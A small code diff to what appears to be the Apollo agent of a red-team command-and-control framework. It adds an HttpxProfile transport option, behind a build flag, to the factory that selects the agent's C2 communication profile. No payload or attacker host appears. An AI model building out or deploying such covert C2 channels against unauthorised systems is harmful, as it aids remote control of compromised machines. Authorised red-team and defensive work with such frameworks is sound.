@@ -1,5 +1,8 @@
 ﻿using ApolloInterop.Interfaces;
 using HttpTransport;
+#if HTTPX
+using HttpxTransport;
+#endif
 using System;
 using System.Collections.Generic;
 
@@ -17,7 +20,14 @@ namespace Apollo.Management.C2
             if (c2 == typeof(HttpProfile))
             {
                 return new HttpProfile(parameters, serializer, Agent);
-            } else
+            }
+#if HTTPX
+            else if (c2 == typeof(HttpxProfile))
+            {
+                return new HttpxProfile(parameters, serializer, Agent);
+            }
+#endif
+            else
             {
                 throw new ArgumentException($"Unsupported C2 Profile type: {c2.Name}");
             }
